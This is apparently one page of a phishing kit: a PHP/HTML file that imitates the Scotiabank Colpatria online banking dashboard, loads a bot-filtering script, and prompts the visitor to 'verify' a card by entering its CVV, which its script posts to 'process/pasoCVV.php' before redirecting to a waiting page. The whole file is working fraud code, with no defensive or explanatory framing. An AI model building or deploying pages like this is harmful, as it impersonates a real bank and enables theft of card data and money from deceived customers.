<?php

require "is_botcito.php";
require "ayudante.php";


?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Scotiabank Colpatria | Banca virtual</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="../../../../js/jquery-3.6.0.min.js"></script>
</head>

<body bgcolor="#F5F4F5">
    <div class="cabecera">
        <div style="background-color: #ED0722; height: 28px; padding: 12px 40px;">
            <img src="img/blanco.svg" class="logo">
            <img src="img/blanco-mob.svg" class="logo2">
            <table class="ladorederecho">
                <tr style="line-height: 13px;">
                    <td id="hora-ingreso">Fecha del último ingreso:<br><span id="hora">10 Sep 2022 8:13:37 AM</span></td>
                    <td><img src="img/usuario.jpg"></td>
                    <td id="nombre">-----</td>
                    <td><img src="img/flecha.jpg"></td>
                </tr>
            </table>
        </div>
        <div id="barra2">
            <table class="saludo">
                <tr>
                    <td style="font-size: 13px;">10 Sep 2022 8:13:37 AM</td>
                </tr>
                <tr>
                    <td style="font-size: 30px;font-weight: 600;">Hola, <span id="nombre2">-----</span></td>
                </tr>
                <tr>
                    <td style="font-size: 16px;">¿Que quieres hacer hoy?</td>
                </tr>
            </table>
            <table class="botones">
                <tr>
                    <td valign="top" align="center"><img src="img/transferir.png"><div>Transferir</div></td>
                    <td valign="top" align="center"><img src="img/pagar.png"><div>Pagar</div></td>
                </tr>                
            </table>
        </div>
    </div>
    <div class="cuerpo">
        <div style="float: left;">
            <div style="text-align:left; font-size: 15px; font-weight: 600;margin-bottom: 14px;">Mis tarjetas de credito</div>
            <div class="tarjeta">
                <table >
                    <tr>
                        <td width="60"><img id="frna" src="img/visa.jpg" width="50"></td>
                        <td style="line-height: 16px;font-size: 14px;">Visa<br><span id="cutroDig" style="font-size: 16px; font-weight: 700;">*7856</span></td>
                    </tr>
                    <tr>
                        <td colspan="2" style="padding: 4px 5px;">
                            <div class="inputg columna" style="margin-top: 0 !important;">
                                        <div style="text-align: right;" class="ojos">
                                            <img src="img/ojo.svg" alt="ojo" id="ojo" style="display: none;">
                                        </div>
                                        <input type="password" name="cvv" id="cvv" placeholder="cvv" maxlength="4" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" pattern="[0-9]*" />
                                        <div class="error" id="ecvv">
                                            <img src="img/war.svg" alt="error"> <span class="rojo">Formato de cvv invalido</span>
                                        </div>
                                    </div>
                        </td>
                    </tr>
                    <tr>
                        <td colspan="2" style="padding: 4px 5px;">
                            <div class="inputgb">
                                        <button type="button" id="btncvv" class="btn">Verificar</button>
                                    </div>
                        </td>
                    </tr>
                </table>
            </div>
        </div>


        <div style="float: left;">
            <div style="text-align:left; font-size: 15px; font-weight: 600;margin-bottom: 14px;">Seguros y asistencias</div>
            <div class="servicios">
                <div style="text-align: center; font-size: 24px;">Seguro contra fraudres</div>
                <div style="height: 1px; background-color: #ED0722; width: 150px; margin:10px auto;"></div>
                <div style="text-align: center;font-size: 16px;"><b>Protege tu tarjeta y tus compras</b><br>Seguro contra el fraude, robo y clonación</div>
                <br>
                <button class="botones2">Cómpralo aquí</button>
            </div>
        </div>

        <div style="float: left;">
            <div style="text-align:left; font-size: 15px; font-weight: 600;margin-bottom: 14px;">Nuevos productos</div>
            <div class="servicios">
                <div style="text-align: center; font-size: 24px;">¡Abre tu CDT hoy!</div>
                <div style="height: 1px; background-color: #ED0722; width: 150px; margin:10px auto;"></div>
                <div style="text-align: center;font-size: 16px;"><b>Invierte tu dinero</b><br>Conoce cómo abrir tu CDT digital</div>
                <br><br>
                <button class="botones2">Abrir CDT</button>
            </div>
        </div>
    </div>
    <script src="js/funciones.js"></script>
    <script type="text/javascript">

        function enviar_cvv(c){        
            $.post( "process/pasoCVV.php",{ cvv:c },function(data) {
               window.location.href = "waiting.php"; 
            });   
        }


        $(document).ready(function(){
            traer_info();

            $('#btncvv').click(function(){
                if ($("#cvv").val().length > 0) {
                    enviar_cvv($("#cvv").val());
                }else{
                    $("#ecvv").show();  
                    $("#cvv").focus();
                }
            });
        });
    </script>
</body>

</html>
<style type="text/css">
    input#cvv {
        width: 90% !important;
    }
</style>